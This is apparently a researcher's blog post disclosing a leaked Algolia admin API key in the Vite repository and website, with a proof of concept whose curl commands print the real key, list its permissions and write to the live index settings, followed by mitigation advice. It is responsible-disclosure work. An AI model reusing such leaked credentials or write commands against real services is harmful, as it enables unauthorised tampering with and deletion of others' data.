---
title: Algolia API Key Misconfiguration in Vite
date: '2024-10-14 15:00:00 +1200'
categories:
  - blog
tags:
  - APIs
  - AppSec
  - Hacking
  - Vulnerabilities

---

# Algolia API Key Misconfiguration in Vite Repository

## Overview

While browsing through GitHub (as you do), I discovered a potentially critical security vulnerability in the [Vite](https://github.com/vitejs/vite) repository and on the Vite official website (vitejs.dev). Vite is a very popular frontend development toolkit, with almost 68k stars and 6.1k forks at the time of writing! 

The issue lies in the exposure of an **Algolia API Key** and **App ID** in both the repository and the website's page source. This key grants full administrative privileges, including **Create**, **Read**, **Update**, and **Delete** operations, which could lead to unauthorised data access, modification, and potential exploitation of sensitive information.

This blog post explores the technical details of this vulnerability, provides a proof of concept (PoC) to demonstrate the potential security risks, and suggests mitigation steps to address the issue.

This issue was reported to the Vite team as a **9.8 out of 10** on the CVSS scale, and was promptly resolved. 

| ![Github Advisory](/images/ViteIssue.png) |
|:--:|
| GitHub Advisory |

## Vulnerability Details

The **Algolia API Key** and **App ID** were identified in the Vite GitHub repository at the following locations:
   - **Repository:** `vite/docs/.vitepress/config.ts`
   - **Line:** 124
   - [Link to the file](https://github.com/vitejs/docs-ja/blob/585f7431d24be8bbf004378c4dcf90d99835dce1/.vitepress/config.ts#L124)

2. Within the source code of the Vite website at:
   - **Page:** [vitejs.dev](https://vitejs.dev/)
   - **Line:** 35 (script tag in page source)


### Permissions on the Exposed Key

By querying the permissions on the exposed key using the following command, we can confirm the extent of the issue:

https://==APPID==-dsn.algolia.net/1/keys/==APIKEY==?x-algolia-application-id===APPID==&x-algolia-api-key===APIKEY==

```bash
curl --url 'https://7H67QR5P0A-dsn.algolia.net/1/keys/deaab78bcdfe96b599497d25acc6460e?x-algolia-application-id=7H67QR5P0A&x-algolia-api-key=deaab78bcdfe96b599497d25acc6460e'
```

This request returns the following response:

```json
{
  "value": "deaab78bcdfe96b599497d25acc6460e",
  "createdAt": 1636455175,
  "acl": [
    "search",
    "addObject",
    "deleteObject",
    "deleteIndex",
    "settings",
    "editSettings",
    "listIndexes",
    "browse"
  ],
  "validity": 0,
  "indexes": [
    "vitejs*"
  ],
  "description": "THIS KEY IS USED INTERNALLY BY ALGOLIA: DON'T USE IT BECAUSE IT CAN BE EDITED OR REMOVED AT ANY TIME."
}
```

As we can see, the key has permissions such as:
- **addObject**
- **deleteObject**
- **deleteIndex**
- **editSettings**

The exposed API key is an **admin key** (not just a search key), which provides dangerous permissions that could allow an attacker to perform critical operations, such as modifying data, deleting content, and exposing sensitive information.

## Proof of Concept (PoC)

To demonstrate the severity of this vulnerability safely, here’s a step-by-step proof of concept.

### Step 1: Retrieve the API Key and App ID

Eextract the API key and App ID from either the GitHub repository or the Vite website's page source.

- GitHub Repo: [vite/docs/.vitepress/config.ts](https://github.com/vitejs/docs-ja/blob/585f7431d24be8bbf004378c4dcf90d99835dce1/.vitepress/config.ts#L124)
- Vite Website: Open the [vitejs.dev](https://vitejs.dev/) page and inspect the page source at line 35 to locate the script tag containing the key.

### Step 2: Query the Key’s Permissions

To confirm the level of access this key grants, run the following curl command:

```bash
curl --url 'https://7H67QR5P0A-dsn.algolia.net/1/keys/deaab78bcdfe96b599497d25acc6460e?x-algolia-application-id=7H67QR5P0A&x-algolia-api-key=deaab78bcdfe96b599497d25acc6460e'
```

This returns the permissions for the key, which include the ability to modify or delete data.

### Step 3: Modify Data with the API Key

To safely verify that the key can perform write operations, run the following command to update the settings of the `vitejs` index:

```bash
curl --url https://7H67QR5P0A-1.algolianet.com/1/indexes/vitejs/settings \
  --header 'content-type: application/json' \
  --header 'x-algolia-api-key: deaab78bcdfe96b599497d25acc6460e' \
  --header 'x-algolia-application-id: 7H67QR5P0A' \
  --data '{"highlightPreTag": "SecurityTestingHotanyaR"}'
```


| ![Modify Data](/images/vitePUT.png) |
|:--:|
| Data Injected Into An Existing Tag |

This command modifies the `highlightPreTag` setting, adding a custom tag `SecurityTestingHotanyaR`. 

### Step 4: Verify the Modification

To verify the modification, you can query the settings of the `vitejs` index using the following command:

```bash
curl --request GET \
  --url https://7H67QR5P0A-1.algolianet.com/1/indexes/vitejs/settings \
  --header 'content-type: application/json' \
  --header 'x-algolia-api-key: deaab78bcdfe96b599497d25acc6460e' \
  --header 'x-algolia-application-id: 7H67QR5P0A'
```

| ![Injection](/images/viteInjection.png) |
|:--:|
| Confirming The Data Has Been Injected |

The response confirms that the settings were successfully modified, proving that the API key has write access and the ability to change critical settings.

## Impact of the Vulnerability

The exposure of an Algolia **admin key** poses significant risks, including:

- **Data Modification:** An attacker can modify the content or structure of the Vite site, potentially injecting malicious data.
- **Data Deletion:** The attacker can delete entire indexes, leading to the loss of critical information.
- **Sensitive Data Exposure:** The attacker can read and list all data, leading to exposure of potentially sensitive information.
- **Cross-Site Scripting (XSS):** Since the attacker can modify site content, they could inject malicious XSS payloads directly into the Algolia index.

## Mitigation Steps

To protect against these sort of issues, the following mitigation steps should be undertaken:

1. **Avoid hardcoding secrets where possible and use environment variables:**
   - This ensures that sensitive data is not accidentally exposed when the code is pushed to a public or shared repository.
   - In many cases (such as this) where this is not possible, the principle of least privilidge should be applied.

2. **Apply the principle of least privilidge**
    - Ensure that API keys have the least amount of permissions necessary to perform the required tasks.
    - For example, in Algolia, create API keys with read-only permissions for tasks like search, and avoid using admin keys in client-facing environments.

3. **Use Secure API Key Features**
   - Many services, including Algolia, provide features like Scoped API Keys or Secure API Keys, which restrict API key usage to specific operations, indices, or time periods. [Algolia Secure API Keys](https://www.algolia.com/doc/guides/security/api-keys/)

4. **Audit Repositories for Exposed Secrets**
   - Regularly audit your repositories for exposed secrets using tools like:
        - GitHub Advanced Security (for private repos, it can automatically detect secrets).
        - GitGuardian or truffleHog, which scan repositories for sensitive data like API keys or credentials.
    - If a secret is accidentally committed to a repository, revoke it immediately and rotate the key.

## Conclusion

Exposing sensitive credentials like the Algolia API Key can lead to severe security risks, including data manipulation, deletion, and unauthorized access. Developers must ensure that sensitive information is never hardcoded into public repositories or website source code. By following the mitigation steps outlined above, the Vite team can secure their Algolia configuration and prevent future exploitation.

Stay vigilant about protecting your API keys, and always follow best practices for secure key management!

**References:**
- [Shah Jerry33 Blog - Algolia API Misconfiguration](https://shahjerry33.medium.com/api-misconfiguration-algolia-api-key-b3f4a9f04f0d)
- [Algolia API Key Management](https://www.algolia.com/doc/guides/security/api-keys/)
- [How to Protect Sensitive Data in GitHub Repositories](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#securing-sensitive-data)